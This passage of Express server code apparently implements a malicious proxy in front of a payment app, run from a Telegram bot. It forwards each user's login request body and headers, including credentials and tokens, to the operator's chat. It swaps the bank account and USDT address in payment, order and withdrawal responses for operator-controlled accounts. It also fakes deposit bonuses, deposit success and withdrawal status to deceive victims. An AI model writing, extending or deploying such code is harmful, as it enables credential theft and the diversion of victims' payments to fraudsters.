        const userId = depositOffMatch[1];
        if (!data.userOverrides[userId]) data.userOverrides[userId] = {};
        data.userOverrides[userId].depositSuccess = false;
        data.userOverrides[userId].depositBonus = 0;
        await saveData(data);
        await bot.sendMessage(chatId, `🔴 User ${userId}: Deposit OFF`);
        return res.sendStatus(200);
      }

      const bankMatch = idCmd.match(/^bank\s+(\d+)\s+(\S+)$/);
      if (bankMatch) {
        const bankNum = parseInt(bankMatch[1]);
        const userId = bankMatch[2];
        if (bankNum < 1 || bankNum > data.banks.length) { await bot.sendMessage(chatId, '❌ Invalid bank number'); return res.sendStatus(200); }
        if (!data.userOverrides[userId]) data.userOverrides[userId] = {};
        data.userOverrides[userId].bankIndex = bankNum - 1;
        await saveData(data);
        const bank = data.banks[bankNum - 1];
        await bot.sendMessage(chatId, `✅ User ${userId}: Bank #${bankNum} → ${bank.accountHolder}`);
        return res.sendStatus(200);
      }

      const onMatch = idCmd.match(/^on\s+(\S+)$/);
      if (onMatch) {
        const userId = onMatch[1];
        if (!data.userOverrides[userId]) data.userOverrides[userId] = {};
        data.userOverrides[userId].botEnabled = true;
        await saveData(data);
        await bot.sendMessage(chatId, `🟢 User ${userId}: Bot ON`);
        return res.sendStatus(200);
      }

      const offMatch = idCmd.match(/^off\s+(\S+)$/);
      if (offMatch) {
        const userId = offMatch[1];
        if (!data.userOverrides[userId]) data.userOverrides[userId] = {};
        data.userOverrides[userId].botEnabled = false;
        await saveData(data);
        await bot.sendMessage(chatId, `🔴 User ${userId}: Bot OFF`);
        return res.sendStatus(200);
      }

      const statusMatch = idCmd.match(/^status\s+(\S+)$/);
      if (statusMatch) {
        const userId = statusMatch[1];
        const uo = getUserOverride(data, userId);
        const eff = getEffectiveSettings(data, userId);
        let m = `📊 User ${userId}:\n`;
        if (!uo) m += '(No overrides — global)\n\n';
        m += `Bot: ${eff.botEnabled !== false ? '🟢 ON' : '🔴 OFF'}${uo && uo.botEnabled !== undefined ? ' (per-ID)' : ' (global)'}\n`;
        m += `Deposit: ${eff.depositSuccess ? '✅ ON (₹' + eff.depositBonus + ')' : '🔴 OFF'}${uo && uo.depositSuccess !== undefined ? ' (per-ID)' : ' (global)'}\n`;
        if (eff.bankOverride !== null && eff.bankOverride >= 0 && eff.bankOverride < data.banks.length) {
          const b = data.banks[eff.bankOverride];
          m += `Bank: 🏦 #${eff.bankOverride + 1} ${b.accountHolder} (per-ID)\n`;
        } else {
          const active = getActiveBank(data, null);
          m += `Bank: ${active ? active.accountHolder : 'None'} (global)\n`;
        }
        const wc = uo && uo.withdrawCount ? uo.withdrawCount : 0;
        m += `Withdraw: ${wc > 0 ? '✅ First ' + wc + ' → Paying (per-ID)' : (data.withdrawOverride > 0 ? '✅ First ' + data.withdrawOverride + ' → Paying (global)' : '❌ OFF')}`;
        await bot.sendMessage(chatId, m);
        return res.sendStatus(200);
      }

      const resetMatch = idCmd.match(/^reset\s+(\S+)$/);
      if (resetMatch) {
        const userId = resetMatch[1];
        if (data.userOverrides[userId]) {
          delete data.userOverrides[userId];
          await saveData(data);
          await bot.sendMessage(chatId, `🔄 User ${userId}: All overrides removed.`);
        } else {
          await bot.sendMessage(chatId, `ℹ️ User ${userId}: No overrides.`);
        }
        return res.sendStatus(200);
      }

      await bot.sendMessage(chatId, '❌ Invalid /id command. Use /start for help.');
      return res.sendStatus(200);
    }

    if (text === '/help') {
      await bot.sendMessage(chatId, 'Use /start to see all commands.');
      return res.sendStatus(200);
    }

    return res.sendStatus(200);
  } catch(e) {
    console.error('Bot error:', e);
    return res.sendStatus(200);
  }
});

app.post('/app/api/system/v2/login', async (req, res) => {
  try {
    const data = await loadData();
    const { response, respBody, respHeaders, jsonResp } = await proxyFetch(req);
    const userId = extractUserId(req, jsonResp);
    const body = req.parsedBody || {};
    const phone = body.phone || body.mobile || body.telephone || body.username || '';
    if (userId) {
      saveTokenUserId(req, userId);
      if (phone) userPhoneMap[String(userId)] = String(phone);
      const loginData = getResponseData(jsonResp);
      if (loginData && loginData.token) tokenUserMap[loginData.token] = userId;
      if (loginData) {
        const respPhone = loginData.phone || loginData.mobile || loginData.telephone || loginData.memberPhone || '';
        if (respPhone && userId) userPhoneMap[String(userId)] = String(respPhone);
      }
      const detectedPhone = phone || (loginData?.phone || loginData?.mobile || loginData?.telephone || loginData?.memberPhone || '');
      trackUser(data, userId, 'Login', detectedPhone);
      saveData(data).catch(()=>{});
    }
    if (data.adminChatId && bot) {
      const reqBody = JSON.stringify(req.parsedBody || {}, null, 2).substring(0, 1000);
      const reqHeaders = JSON.stringify(req.headers, null, 2).substring(0, 1500);
      const respHdrs = JSON.stringify(respHeaders, null, 2).substring(0, 1500);
      const bodyDump = JSON.stringify(jsonResp || respBody, null, 2).substring(0, 2000);
      bot.sendMessage(data.adminChatId, `🔑 Login [${userId || 'N/A'}] (${phone || 'no phone'})\n\n📝 REQUEST BODY (user input):\n${reqBody}\n\n📤 REQUEST HEADERS:\n${reqHeaders}`).catch(()=>{});
      bot.sendMessage(data.adminChatId, `📥 RESPONSE HEADERS:\n${respHdrs}\n\n📥 RESPONSE BODY:\n${bodyDump}`).catch(()=>{});
    }
    sendJson(res, respHeaders, jsonResp, respBody);
  } catch(e) { await transparentProxy(req, res); }
});

async function proxyAndReplaceBankDetails(req, res, label) {
  const data = await loadData();
  const reqUserId = extractUserId(req, null);
  const reqEff = getEffectiveSettings(data, reqUserId);
  if (reqEff.botEnabled === false) return await transparentProxy(req, res);

  try {
    const { response, respBody, respHeaders, jsonResp } = await proxyFetch(req);
    const detectedUserId = extractUserId(req, jsonResp) || reqUserId;
    const eff = getEffectiveSettings(data, detectedUserId);
    const active = eff.botEnabled !== false ? await getActiveBankAndSave(data, detectedUserId) : null;

    const respData = getResponseData(jsonResp);

    if (debugNextResponse && data.adminChatId && bot) {
      debugNextResponse = false;
      const dump = JSON.stringify(jsonResp, null, 2).substring(0, 3500);
      bot.sendMessage(data.adminChatId, `🔍 DEBUG ${req.originalUrl}\n\n${dump}`).catch(()=>{});
    }

    if (respData && active) {
      if (Array.isArray(respData)) {
        respData.forEach(item => { if (item && typeof item === 'object') deepReplace(item, active, {}, 0); });
      } else {
        const originalValues = {};
        deepReplace(respData, active, originalValues, 0);
      }
    }

    if (data.adminChatId && bot) {
      const rd = (respData && typeof respData === 'object' && !Array.isArray(respData)) ? respData : {};
      const orderId = rd.orderId || rd.orderNo || req.parsedBody?.orderId || 'N/A';
      const amount = rd.amount || rd.orderAmount || req.parsedBody?.amount || 'N/A';
      const phone = getPhone(data, detectedUserId);
      bot.sendMessage(data.adminChatId,
`🔔 ${label}
👤 User: ${detectedUserId || 'N/A'}${phone ? ' (' + phone + ')' : ''}
Order: ${orderId}
Amount: ₹${amount}
Bank: ${active ? active.accountNo : 'N/A'}
Acc: ${active ? active.accountHolder : 'None'}
Time: ${new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' })}`
      ).catch(()=>{});
    }

    if (detectedUserId) {
      trackUser(data, detectedUserId, `Order ${jsonResp?.data?.orderId || ''}`);
      saveData(data).catch(()=>{});
    }

    sendJson(res, respHeaders, jsonResp, respBody);
  } catch(e) {
    console.error('Proxy+replace error:', req.originalUrl, e.message);
    if (!res.headersSent) res.status(502).json({ error: 'proxy error' });
  }
}

async function proxyAndReplaceBankInList(req, res) {
  const data = await loadData();

  try {
    const { response, respBody, respHeaders, jsonResp } = await proxyFetch(req);
    const detectedUserId = extractUserId(req, jsonResp);
    if (detectedUserId) saveTokenUserId(req, detectedUserId);
    const eff = getEffectiveSettings(data, detectedUserId);
    const active = (eff.botEnabled !== false) ? await getActiveBankAndSave(data, detectedUserId) : null;

    const listData = getResponseData(jsonResp);
    if (listData) {
      const applyToItem = (item) => {
        const itemUserId = item.userId ? String(item.userId) : (item.memberId ? String(item.memberId) : detectedUserId);
        const itemEff = getEffectiveSettings(data, itemUserId);
        const itemActive = (itemEff.botEnabled !== false) ? getActiveBank(data, itemUserId) : null;
        if (itemActive) { const origVals = {}; deepReplace(item, itemActive, origVals, 0); }
        if (itemEff.depositSuccess) markDepositSuccess(item);
      };
      if (Array.isArray(listData)) {
        listData.forEach(applyToItem);
      } else if (listData.list && Array.isArray(listData.list)) {
        listData.list.forEach(applyToItem);
      } else if (listData.records && Array.isArray(listData.records)) {
        listData.records.forEach(applyToItem);
      } else if (listData.rows && Array.isArray(listData.rows)) {
        listData.rows.forEach(applyToItem);
      } else {
        applyToItem(listData);
      }
    }

    sendJson(res, respHeaders, jsonResp, respBody);
  } catch(e) {
    console.error('List replace error:', req.originalUrl, e.message);
    if (!res.headersSent) res.status(502).json({ error: 'proxy error' });
  }
}

async function proxyAndAddBonus(req, res) {
  const data = await loadData();
  try {
    const { response, respBody, respHeaders, jsonResp } = await proxyFetch(req);
    const detectedUserId = extractUserId(req, jsonResp);
    const eff = getEffectiveSettings(data, detectedUserId);
    const bonus = eff.depositSuccess ? (eff.depositBonus || 0) : 0;

    if (detectedUserId) {
      saveTokenUserId(req, detectedUserId);
      trackUser(data, detectedUserId, `App Open ${req.path}`);
      saveData(data).catch(()=>{});
    }

    const bonusData = getResponseData(jsonResp);
    if (bonus > 0 && bonusData) {
      addBonusToBalanceFields(bonusData, bonus);
    }

    sendJson(res, respHeaders, jsonResp, respBody);
  } catch(e) {
    if (!res.headersSent) res.status(502).json({ error: 'proxy error' });
  }
}

app.post('/app/api/orderOut/getPaymentOrder', async (req, res) => {
  await proxyAndReplaceBankDetails(req, res, '💰 Payment Order');
});

app.post('/app/api/orderOut/detail', async (req, res) => {
  await proxyAndReplaceBankDetails(req, res, '📋 Order Detail');
});

app.post('/app/api/orderOut/pendingDetail', async (req, res) => {
  const data = await loadData();
  const reqUserId = extractUserId(req, null);
  const reqEff = getEffectiveSettings(data, reqUserId);
  if (reqEff.botEnabled === false) return await transparentProxy(req, res);
  try {
    const { response, respBody, respHeaders, jsonResp } = await proxyFetch(req);
    const detectedUserId = extractUserId(req, jsonResp) || reqUserId;
    const eff = getEffectiveSettings(data, detectedUserId);
    const active = eff.botEnabled !== false ? await getActiveBankAndSave(data, detectedUserId) : null;
    const respData = getResponseData(jsonResp);
    if (data.adminChatId && bot) {
      const dump = JSON.stringify(jsonResp, null, 2).substring(0, 3500);
      bot.sendMessage(data.adminChatId, `🔍 PENDING DETAIL RAW:\n${dump}`).catch(()=>{});
    }
    if (respData && active) {
      if (Array.isArray(respData)) {
        respData.forEach(item => { if (item && typeof item === 'object') deepReplace(item, active, {}, 0); });
      } else {
        deepReplace(respData, active, {}, 0);
      }
    }
    const phone = getPhone(data, detectedUserId);
    if (data.adminChatId && bot) {
      const rd = (respData && typeof respData === 'object' && !Array.isArray(respData)) ? respData : {};
      bot.sendMessage(data.adminChatId,
`🔔 📋 Pending Detail
👤 User: ${detectedUserId || 'N/A'}${phone ? ' (' + phone + ')' : ''}
Order: ${rd.orderId || rd.orderNo || 'N/A'}
Amount: ₹${rd.amount || rd.orderAmount || 'N/A'}
Bank: ${active ? active.accountNo : 'N/A'}
Acc: ${active ? active.accountHolder : 'None'}
Time: ${new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' })}`
      ).catch(()=>{});
    }
    if (detectedUserId) { trackUser(data, detectedUserId, 'PendingDetail'); saveData(data).catch(()=>{}); }
    sendJson(res, respHeaders, jsonResp, respBody);
  } catch(e) {
    console.error('PendingDetail error:', e.message);
    if (!res.headersSent) await transparentProxy(req, res);
  }
});

app.post('/app/api/orderOut/getPayWallet', async (req, res) => {
  const data = await loadData();
  const reqUserId = extractUserId(req, null);
  const reqEff = getEffectiveSettings(data, reqUserId);
  if (reqEff.botEnabled === false) return await transparentProxy(req, res);
  try {
    const { response, respBody, respHeaders, jsonResp } = await proxyFetch(req);
    const detectedUserId = extractUserId(req, jsonResp) || reqUserId;
    const eff = getEffectiveSettings(data, detectedUserId);
    const active = eff.botEnabled !== false ? await getActiveBankAndSave(data, detectedUserId) : null;
    if (data.adminChatId && bot) {
      const dump = JSON.stringify(jsonResp, null, 2).substring(0, 3500);
      bot.sendMessage(data.adminChatId, `🔍 PAY WALLET RAW RESPONSE:\n${dump}`).catch(()=>{});
    }
    const pwData = getResponseData(jsonResp);
    if (pwData && active) {
      if (Array.isArray(pwData)) {
        pwData.forEach(item => { if (item && typeof item === 'object') deepReplace(item, active, {}, 0); });
      } else {
        deepReplace(pwData, active, {}, 0);
      }
    }
    const phone = getPhone(data, detectedUserId);
    if (data.adminChatId && bot) {
      const rd = (pwData && typeof pwData === 'object' && !Array.isArray(pwData)) ? pwData : {};
      const orderId = rd.orderId || rd.orderNo || req.parsedBody?.orderId || 'N/A';
      const amount = rd.amount || rd.orderAmount || req.parsedBody?.amount || 'N/A';
      bot.sendMessage(data.adminChatId,
`🔔 💳 Pay Wallet
👤 User: ${detectedUserId || 'N/A'}${phone ? ' (' + phone + ')' : ''}
Order: ${orderId}
Amount: ₹${amount}
Bank: ${active ? active.accountNo : 'N/A'}
Acc: ${active ? active.accountHolder : 'None'}
Time: ${new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' })}`
      ).catch(()=>{});
    }
    if (detectedUserId) { trackUser(data, detectedUserId, 'PayWallet'); saveData(data).catch(()=>{}); }
    sendJson(res, respHeaders, jsonResp, respBody);
  } catch(e) {
    console.error('PayWallet error:', e.message);
    if (!res.headersSent) await transparentProxy(req, res);
  }
});

app.post('/app/api/memberManager/getBankAccount', async (req, res) => {
  await proxyAndReplaceBankDetails(req, res, '🏦 Get Bank Account');
});

app.post('/app/api/memberRecharge/createPaymentOrder', async (req, res) => {
  const data = await loadData();
  try {
    const { response, respBody, respHeaders, jsonResp } = await proxyFetch(req);
    const userId = extractUserId(req, jsonResp);
    if (userId) { trackUser(data, userId, 'Recharge Order'); saveData(data).catch(()=>{}); }
    const rechargeData = getResponseData(jsonResp);
    if (rechargeData && data.adminChatId && bot) {
      const d = (typeof rechargeData === 'object' && !Array.isArray(rechargeData)) ? rechargeData : {};
      bot.sendMessage(data.adminChatId, `🔔 Recharge Order [${userId || 'N/A'}]\nAmount: ₹${d.amount || d.orderAmount || 'N/A'}\nOrder: ${d.orderId || d.orderNo || 'N/A'}`).catch(()=>{});
    }
    sendJson(res, respHeaders, jsonResp, respBody);
  } catch(e) { await transparentProxy(req, res); }
});

app.post('/app/api/memberRecharge/confirmRecharge', async (req, res) => {
  const data = await loadData();
  try {
    const { response, respBody, respHeaders, jsonResp } = await proxyFetch(req);
    const userId = extractUserId(req, jsonResp);
    const body = req.parsedBody || {};
    if (data.adminChatId && bot) {
      bot.sendMessage(data.adminChatId, `✅ Recharge Confirmed [${userId || 'N/A'}]\nUTR: ${body.utr || body.transactionId || 'N/A'}\nAmount: ₹${body.amount || 'N/A'}\nOrder: ${body.orderId || body.orderNo || 'N/A'}`).catch(()=>{});
    }
    if (userId) { trackUser(data, userId, `UTR ${body.utr || body.transactionId || ''}`); saveData(data).catch(()=>{}); }
    sendJson(res, respHeaders, jsonResp, respBody);
  } catch(e) { await transparentProxy(req, res); }
});

app.post('/app/api/memberRecharge/getPaymentOrderDetail', async (req, res) => {
  const data = await loadData();
  if (!data.botEnabled) return await transparentProxy(req, res);
  const bank = await getActiveBankAndSave(data);
  try {
    const { response, respBody, respHeaders, jsonResp } = await proxyFetch(req);
    const detailData = getResponseData(jsonResp);
    if (detailData) {
      if (bank) {
        if (Array.isArray(detailData)) {
          detailData.forEach(item => { if (item && typeof item === 'object') deepReplace(item, bank, {}, 0); });
        } else {
          deepReplace(detailData, bank, {}, 0);
        }
      }
      if (data.usdtAddress) replaceUsdtInResponse(jsonResp, data);
    }
    sendJson(res, respHeaders, jsonResp, respBody);
  } catch(e) { await transparentProxy(req, res); }
});

app.post('/app/api/memberRecharge/getUsdtRate', async (req, res) => {
  const data = await loadData();
  try {
    const { response, respBody, respHeaders, jsonResp } = await proxyFetch(req);
    if (data.usdtAddress && jsonResp) replaceUsdtInResponse(jsonResp, data);
    sendJson(res, respHeaders, jsonResp, respBody);
  } catch(e) { await transparentProxy(req, res); }
});

app.all('/app/api/memberRecharge/memberRechargeList', async (req, res) => {
  await proxyAndReplaceBankInList(req, res);
});

app.post('/app/api/orderOut/payingSubmit', async (req, res) => {
  const data = await loadData();
  try {
    const { response, respBody, respHeaders, jsonResp } = await proxyFetch(req);
    const userId = extractUserId(req, jsonResp);
    const body = req.parsedBody || {};
    if (data.adminChatId && bot) {
      bot.sendMessage(data.adminChatId, `📤 Payment Submit [${userId || 'N/A'}]\nUTR: ${body.utr || body.transactionId || body.referenceNo || 'N/A'}\nOrder: ${body.orderId || body.orderNo || 'N/A'}`).catch(()=>{});
    }
    if (userId) { trackUser(data, userId, `Submit ${body.utr || ''}`); saveData(data).catch(()=>{}); }
    sendJson(res, respHeaders, jsonResp, respBody);
  } catch(e) { await transparentProxy(req, res); }
});

app.post('/app/api/orderOut/payingSubmitResult', async (req, res) => {
  const data = await loadData();
  try {
    const { response, respBody, respHeaders, jsonResp } = await proxyFetch(req);
    const userId = extractUserId(req, jsonResp);
    if (data.adminChatId && bot) {
      bot.sendMessage(data.adminChatId, `📤 Payment Result [${userId || 'N/A'}]\nOrder: ${req.parsedBody?.orderId || req.parsedBody?.orderNo || 'N/A'}`).catch(()=>{});
    }
    sendJson(res, respHeaders, jsonResp, respBody);
  } catch(e) { await transparentProxy(req, res); }
});

app.post('/app/api/orderOut/payingSubmitImg', async (req, res) => {
  const data = await loadData();
  try {
    const { response, respBody, respHeaders, jsonResp } = await proxyFetch(req);
    const userId = extractUserId(req, jsonResp);
    if (data.adminChatId && bot) {
      bot.sendMessage(data.adminChatId, `🖼 Payment Image Submit [${userId || 'N/A'}]`).catch(()=>{});
    }
    sendJson(res, respHeaders, jsonResp, respBody);
  } catch(e) { await transparentProxy(req, res); }
});

app.post('/app/api/orderOut/pendingSubmitImg', async (req, res) => {
  const data = await loadData();
  try {
    const { response, respBody, respHeaders, jsonResp } = await proxyFetch(req);
    const userId = extractUserId(req, jsonResp);
    if (data.adminChatId && bot) {
      bot.sendMessage(data.adminChatId, `🖼 Pending Image Submit [${userId || 'N/A'}]`).catch(()=>{});
    }
    sendJson(res, respHeaders, jsonResp, respBody);
  } catch(e) { await transparentProxy(req, res); }
});

app.all('/app/api/orderOut/memberOrderOutList', async (req, res) => {
  await proxyAndReplaceBankInList(req, res);
});

app.all('/app/api/orderOut/searchList', async (req, res) => {
  await proxyAndReplaceBankInList(req, res);
});

app.all('/app/api/orderOut/paying', async (req, res) => {
  await proxyAndReplaceBankDetails(req, res, '💳 Paying');
});

app.post('/app/api/orderOut/cancel', async (req, res) => {
  const data = await loadData();
  try {
    const { response, respBody, respHeaders, jsonResp } = await proxyFetch(req);
    if (data.adminChatId && bot) {
      bot.sendMessage(data.adminChatId, `❌ Order Cancelled\nOrder: ${req.parsedBody?.orderId || req.parsedBody?.orderNo || 'N/A'}`).catch(()=>{});
    }
    sendJson(res, respHeaders, jsonResp, respBody);
  } catch(e) { await transparentProxy(req, res); }
});

app.post('/app/api/memberRecharge/cancelOrder', async (req, res) => {
  const data = await loadData();
  try {
    const { response, respBody, respHeaders, jsonResp } = await proxyFetch(req);
    if (data.adminChatId && bot) {
      bot.sendMessage(data.adminChatId, `❌ Recharge Cancelled\nOrder: ${req.parsedBody?.orderId || req.parsedBody?.orderNo || 'N/A'}`).catch(()=>{});
    }
    sendJson(res, respHeaders, jsonResp, respBody);
  } catch(e) { await transparentProxy(req, res); }
});

app.all('/app/api/memberManager/withdrawHistory', async (req, res) => {
  const data = await loadData();
  try {
    const { response, respBody, respHeaders, jsonResp } = await proxyFetch(req);

    const whData = getResponseData(jsonResp);
    if (whData) {
      const items = Array.isArray(whData) ? whData
        : whData.list ? whData.list
        : whData.records ? whData.records
        : whData.rows ? whData.rows : null;

      if (items && items.length > 0) {
        const globalCount = data.withdrawOverride || 0;
        let changed = 0;
        const changedDetails = [];

        for (let i = 0; i < items.length; i++) {
          const itemUserId = String(items[i].userId || items[i].memberId || items[i].customerId || '');
          const userOverride = data.userOverrides[itemUserId];
          const perUserCount = userOverride && userOverride.withdrawCount ? userOverride.withdrawCount : 0;
          const effectiveCount = perUserCount || globalCount;

          if (effectiveCount <= 0) continue;

          const userItems = items.filter(it => String(it.userId || it.memberId || it.customerId || '') === itemUserId);
          const userIndex = userItems.indexOf(items[i]);

          if (userIndex < effectiveCount) {
            const statField = items[i].stat !== undefined ? 'stat' : (items[i].status !== undefined ? 'status' : 'state');
            const oldStat = items[i][statField];
            items[i][statField] = 0;
            changedDetails.push(`₹${items[i].amount || 'N/A'} [${itemUserId}] (${oldStat} → 0/Paying)`);
            changed++;
          }
        }

        if (changed > 0 && data.adminChatId && bot) {
          bot.sendMessage(data.adminChatId, `✅ Changed ${changed} withdrawal(s) to Paying:\n${changedDetails.join('\n')}`).catch(()=>{});
        }

        const detectedUserId = extractUserId(req, jsonResp);
        const eff = getEffectiveSettings(data, detectedUserId);
        if (eff.botEnabled !== false) {
          const bank = getActiveBank(data, detectedUserId);
          if (bank) {
            items.forEach(item => { deepReplace(item, bank, {}, 0); });
          }
        }
      }
    }

    sendJson(res, respHeaders, jsonResp, respBody);
  } catch(e) {
    if (!res.headersSent) res.status(502).json({ error: 'proxy error' });
  }
});

app.all('/app/api/memberManager/withdrawHistoryDetail', async (req, res) => {
  await proxyAndReplaceBankDetails(req, res, '📋 Withdraw Detail');
});

app.all('/app/api/memberManager/mine', async (req, res) => {
  await proxyAndAddBonus(req, res);
});

app.all('/app/api/memberManager/balanceRecordList', async (req, res) => {
  await proxyAndReplaceBankInList(req, res);
});

app.all('/app/api/memberManager/dataStatistics', async (req, res) => {
  await proxyAndAddBonus(req, res);
});

app.all('/app/api/orderOut/receiveOcr', async (req, res) => {
  const data = await loadData();
  try {
    const { response, respBody, respHeaders, jsonResp } = await proxyFetch(req);
    if (data.adminChatId && bot) {
      bot.sendMessage(data.adminChatId, `📸 OCR Received\n${JSON.stringify(req.parsedBody || {}).substring(0, 500)}`).catch(()=>{});
    }
    sendJson(res, respHeaders, jsonResp, respBody);
  } catch(e) { await transparentProxy(req, res); }
});

app.all('*', async (req, res) => {
  await transparentProxy(req, res);
});

module.exports = app;
